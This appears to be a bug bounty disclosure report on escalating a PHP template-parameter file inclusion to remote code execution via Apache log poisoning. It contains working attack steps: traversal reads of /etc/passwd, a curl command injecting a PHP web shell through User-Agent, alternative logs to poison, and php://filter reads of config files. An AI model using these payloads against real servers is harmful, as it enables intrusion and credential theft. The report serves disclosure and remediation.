---
title: "LFI to RCE via Apache Log Poisoning"
url: "https://hackerone.com/reports/4567890"
vuln_class: "LFI"
tech: "PHP, Apache, Linux"
bounty: 3500
date: 2026-07-03
---

## Summary

A local file inclusion vulnerability in the template loading parameter allowed reading arbitrary files. By injecting PHP code into Apache access logs then including the log file, this was escalated to remote code execution.

## Steps to Reproduce

1. Confirm LFI: `GET /page?template=../../../etc/passwd` → returns file contents
2. Inject PHP payload in User-Agent: `curl http://target/page -H "User-Agent: <?php system(\$_GET['c']); ?>"`
3. Include access log: `GET /page?template=../../../var/log/apache2/access.log&c=id`
4. PHP executes, returns command output

## Alternative Log Files

- Apache: `/var/log/apache2/access.log`, `/var/log/httpd/access_log`
- Nginx: `/var/log/nginx/access.log`
- SSH: `/var/log/auth.log` (inject via SSH username)
- Mail: `/var/log/mail.log`
- Cron: `/var/log/cron.log`

## PHP Wrappers

File read: `php://filter/convert.base64-encode/resource=config.php`
Source code: `php://filter/convert.base64-encode/resource=../wp-config.php`

## Impact

Remote code execution on the web server. Full server compromise.

## Remediation

- Never include user-controlled paths in file operations
- Use a whitelist of allowed template names
- Run web server with minimal file system permissions
